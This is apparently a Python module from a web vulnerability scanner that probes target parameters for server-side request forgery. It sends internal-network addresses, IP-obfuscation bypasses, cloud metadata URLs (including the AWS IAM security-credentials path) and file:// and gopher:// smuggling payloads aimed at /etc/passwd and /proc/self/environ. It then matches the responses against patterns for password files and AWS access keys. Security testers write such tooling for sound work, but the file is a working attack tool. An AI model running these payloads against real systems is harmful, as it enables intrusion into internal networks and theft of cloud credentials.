"""Phase 2.5 — SSRF (Server-Side Request Forgery) Tests.

Tests for:
- Internal network access (localhost, 127.0.0.1, 0.0.0.0)
- Cloud metadata endpoints (AWS, GCP, Azure)
- DNS rebinding / IP obfuscation
- Protocol smuggling (file://, gopher://)
"""
from __future__ import annotations

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable
from urllib.parse import quote

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════
# Data structures
# ═══════════════════════════════════════════════════════════════


@dataclass
class SSRFFinding:
    vuln_type: str
    title: str
    severity: str
    url: str
    param: str
    payload: str
    evidence: str
    request_id: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence[:500],
            "request_id": self.request_id,
        }


@dataclass
class SSRFTestResult:
    target_url: str
    test_type: str
    findings: list[SSRFFinding] = field(default_factory=list)
    requests_sent: int = 0
    errors: list[str] = field(default_factory=list)
    duration: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "target_url": self.target_url,
            "test_type": self.test_type,
            "findings_count": len(self.findings),
            "requests_sent": self.requests_sent,
            "errors": self.errors[:10],
            "duration": round(self.duration, 2),
        }


# ═══════════════════════════════════════════════════════════════
# Payload sets
# ═══════════════════════════════════════════════════════════════

SSRF_INTERNAL_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8080/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
]

SSRF_CLOUD_METADATA = [
    # AWS
    ("http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ""),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", ""),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", ""),
]

SSRF_PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "gopher://127.0.0.1:25/_EHLO%20attacker",
    "dict://127.0.0.1:11211/stat",
]

SSRF_BYPASS_PAYLOADS = [
    "http://0x7f000001/",               # hex IP
    "http://2130706433/",               # decimal IP
    "http://017700000001/",             # octal IP
    "http://localhost.localdomain/",
    "http://127.0.0.1.nip.io/",        # DNS rebinding
    "http://spoofed.burpcollaborator.net/",  # OOB marker
]

# Patterns indicating SSRF success
SSRF_INTERNAL_PATTERNS = [
    r"root:.*:0:0:",                    # /etc/passwd
    r"SSH-\d",                          # SSH banner
    r"REDIS|redis_version",             # Redis
    r"MariaDB|MySQL",                   # MySQL banner
    r"<title>.*Apache.*</title>",       # Internal web server
    r"<html",                           # Any HTML from internal
    r"Connection refused",              # Port scanning indicator
    r"eth0|docker0|veth",               # Network interfaces
]

SSRF_CLOUD_PATTERNS = [
    r"ami-[a-f0-9]+",                   # AWS AMI ID
    r"instance-id",                     # Cloud instance
    r"AccessKeyId",                     # AWS credentials
    r"computeMetadata",                 # GCP metadata
    r"\"vmId\"",                        # Azure VM ID
]


# ═══════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════

def _build_get(
    path: str, host: str, param: str, value: str,
    cookie: str = "", extra_params: dict[str, str] | None = None,
) -> str:
    qs = f"{param}={quote(value, safe='')}"
    if extra_params:
        for k, v in extra_params.items():
            qs += f"&{k}={quote(v, safe='')}"
    h = f"GET {path}?{qs} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: WebPhomet/1.0\r\nAccept: */*"
    if cookie:
        h += f"\r\nCookie: {cookie}"
    return h + "\r\n\r\n"


def _build_post(
    path: str, host: str, params: dict[str, str], cookie: str = "",
) -> str:
    body = "&".join(f"{k}={quote(v, safe='')}" for k, v in params.items())
    h = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: WebPhomet/1.0\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Accept: */*"
    )
    if cookie:
        h += f"\r\nCookie: {cookie}"
    return h + "\r\n\r\n" + body


# ═══════════════════════════════════════════════════════════════
# Test: SSRF Internal Network
# ═══════════════════════════════════════════════════════════════

async def test_ssrf_internal(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> SSRFTestResult:
    """Test for SSRF by injecting internal URLs into a parameter."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = SSRFTestResult(target_url=base_url, test_type="ssrf_internal")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    # First send a benign request to get baseline
    benign = "http://example.com/"
    if method == "GET":
        raw = _build_get(path, host_header, param, benign, cookie, extra_params)
    else:
        params = {param: benign}
        if extra_params:
            params.update(extra_params)
        raw = _build_post(path, host_header, params, cookie)

    try:
        baseline = await send_fn(raw, host, port, is_tls)
        result.requests_sent += 1
        baseline_len = len(baseline.get("body", ""))
    except Exception:
        baseline_len = 0

    for payload in SSRF_INTERNAL_PAYLOADS + SSRF_BYPASS_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id")

            for pattern in SSRF_INTERNAL_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    result.findings.append(SSRFFinding(
                        vuln_type="ssrf",
                        title=f"SSRF: Internal network access via {param}",
                        severity="critical",
                        url=base_url,
                        param=param,
                        payload=payload,
                        evidence=f"Pattern '{pattern}' matched in response",
                        request_id=req_id,
                    ))
                    break

            # Also check if response differs significantly from baseline
            if body and abs(len(body) - baseline_len) > 200 and not result.findings:
                result.findings.append(SSRFFinding(
                    vuln_type="ssrf",
                    title=f"Potential SSRF: response size changed ({param})",
                    severity="medium",
                    url=base_url,
                    param=param,
                    payload=payload,
                    evidence=f"Response {len(body)} bytes vs baseline {baseline_len} bytes",
                    request_id=req_id,
                ))
        except Exception as exc:
            result.errors.append(f"ssrf_internal {payload[:50]}: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: SSRF Cloud Metadata
# ═══════════════════════════════════════════════════════════════

async def test_ssrf_cloud_metadata(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> SSRFTestResult:
    """Test for SSRF access to cloud metadata endpoints."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = SSRFTestResult(target_url=base_url, test_type="ssrf_cloud_metadata")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    for metadata_url, marker in SSRF_CLOUD_METADATA:
        try:
            if method == "GET":
                raw = _build_get(path, host_header, param, metadata_url, cookie, extra_params)
            else:
                params = {param: metadata_url}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id")

            # Check for cloud metadata patterns or specific marker
            hit = False
            if marker and marker.lower() in body.lower():
                hit = True
            for pattern in SSRF_CLOUD_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    hit = True
                    break

            if hit:
                result.findings.append(SSRFFinding(
                    vuln_type="ssrf_cloud",
                    title=f"SSRF: Cloud metadata access via {param}",
                    severity="critical",
                    url=base_url,
                    param=param,
                    payload=metadata_url,
                    evidence=f"Cloud metadata response detected",
                    request_id=req_id,
                ))
        except Exception as exc:
            result.errors.append(f"ssrf_cloud {metadata_url[:50]}: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: SSRF Protocol Smuggling
# ═══════════════════════════════════════════════════════════════

async def test_ssrf_protocol(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> SSRFTestResult:
    """Test for SSRF via protocol smuggling (file://, gopher://)."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = SSRFTestResult(target_url=base_url, test_type="ssrf_protocol")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    for payload in SSRF_PROTOCOL_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id")

            for pattern in SSRF_INTERNAL_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    result.findings.append(SSRFFinding(
                        vuln_type="ssrf_protocol",
                        title=f"SSRF: Protocol smuggling ({payload.split(':')[0]}) via {param}",
                        severity="critical",
                        url=base_url,
                        param=param,
                        payload=payload,
                        evidence=f"Pattern '{pattern}' matched",
                        request_id=req_id,
                    ))
                    break
        except Exception as exc:
            result.errors.append(f"ssrf_protocol {payload[:50]}: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test mapping + combined runner
# ═══════════════════════════════════════════════════════════════

SSRF_TESTS: dict[str, Callable] = {
    "ssrf_internal": test_ssrf_internal,
    "ssrf_cloud_metadata": test_ssrf_cloud_metadata,
    "ssrf_protocol": test_ssrf_protocol,
}


async def run_ssrf_tests(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    targets: list[dict[str, Any]],
    test_types: list[str] | None = None,
    cookie: str = "",
) -> list[SSRFTestResult]:
    """Run SSRF tests against provided targets.

    Parameters
    ----------
    targets: List of {path, param, method, extra_params}.
    test_types: default all.
    """
    if test_types is None:
        test_types = list(SSRF_TESTS.keys())

    results: list[SSRFTestResult] = []
    for target in targets:
        path = target.get("path", "/")
        param = target.get("param", "url")
        method = target.get("method", "GET")
        extra_params = target.get("extra_params")

        for test_type in test_types:
            if test_type in SSRF_TESTS:
                fn = SSRF_TESTS[test_type]
                r = await fn(
                    send_fn=send_fn,
                    host=host,
                    port=port,
                    is_tls=is_tls,
                    path=path,
                    param=param,
                    method=method,
                    cookie=cookie,
                    extra_params=extra_params,
                )
                results.append(r)
            else:
                logger.warning("Unknown SSRF test type: %s", test_type)

    return results
